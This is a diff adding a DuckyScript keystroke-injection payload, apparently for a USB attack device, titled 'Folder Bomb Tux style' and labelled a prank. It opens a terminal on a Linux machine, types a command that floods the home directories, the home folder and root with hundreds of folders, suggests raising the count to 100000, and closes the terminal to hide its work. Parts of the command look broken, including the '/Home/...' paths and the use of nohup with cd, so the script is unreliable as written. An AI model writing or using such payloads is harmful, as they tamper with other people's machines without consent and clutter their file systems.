@@ -1,0 +1,18 @@
+REM Title: Folder Bomb Tux style
+REM Author: FalsePhilosopher
+REM Target:  Unix-like tested on kubuntu 22.04.
+REM Props: Hak5, the community and memes
+REM Version: 1.0
+REM Category: Prank
+REM Launches a terminal, spawns 420 folders in each home dir, home, and root. Change the 420 to 100000 or something if you want more folders.
+REM
+DELAY 300
+REM Minimize all windows as that ensures launch happens smoother.
+WINDOWS d
+DELAY 300
+CTRL-ALT t
+DELAY 2000
+STRING nohup cd /Home/Pictures && mkdir folder{1..420} 2>/dev/null & cd /Home/Documents && mkdir folder{1..420} 2>/dev/null & cd /Home/Music && mkdir folder{1..420} 2>/dev/null & cd /Home/Videos && mkdir folder{1..420} 2>/dev/null & cd /Home/Desktop && mkdir folder{1..420} 2>/dev/null & cd .. && mkdir folder{1..420} 2>/dev/null & cd .. && mkdir folder{1..420} 2>/dev/null & disown
+ENTER
+DELAY 500
+ALT F4
